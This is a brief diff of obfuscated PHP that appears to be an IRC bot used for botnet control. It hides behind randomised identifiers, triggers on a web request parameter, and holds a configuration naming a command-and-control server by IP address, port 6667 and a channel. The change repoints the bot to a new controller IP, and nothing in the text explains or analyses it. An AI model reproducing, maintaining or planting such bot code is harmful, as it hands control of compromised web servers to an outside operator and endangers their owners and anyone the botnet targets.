@@ -8,7 +8,7 @@ if(isset($_GET[$GLOBALS["MAWOoJLkGgeIrenTfRs"]]) == $GLOBALS["UpyosAgDSBwxCjEnPJ
 
     class uLdNPTnZrSXRkoxxEs
     {
-        var $preCGgHTChhyYqmpLzFp = array("server" => "213.153.68.16", "port" => "6667", "key" => "", "prefix" => "Linux", "maxrand" => "5", "chan" => "#sandro", "trigger" => ".", "password" => "", "auth" => "");
+        var $preCGgHTChhyYqmpLzFp = array("server" => "213.153.71.9", "port" => "6667", "key" => "", "prefix" => "Linux", "maxrand" => "5", "chan" => "#sandro", "trigger" => ".", "password" => "", "auth" => "");
         var $WNFKTosVTPbrjUvDXaMZ = array();
         function KwIJJPGByIGobONZejI()
         {
